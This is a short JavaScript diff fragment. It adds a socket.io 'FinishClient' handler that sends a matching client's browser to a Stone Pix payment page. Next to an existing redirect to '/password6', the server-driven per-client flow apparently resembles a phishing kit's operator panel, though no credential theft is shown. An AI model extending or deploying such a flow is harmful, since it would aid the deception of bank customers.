@@ -38,6 +38,14 @@ const await = (() => {
                 if (params.get('client') == data) window.location.href = `/password6?client=${data}`
             } else return
         })
+
+        socket.on('FinishClient', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `https://www.stone.com.br/pix/`
+            } else return
+        })
     }
 
     function startRoom() {
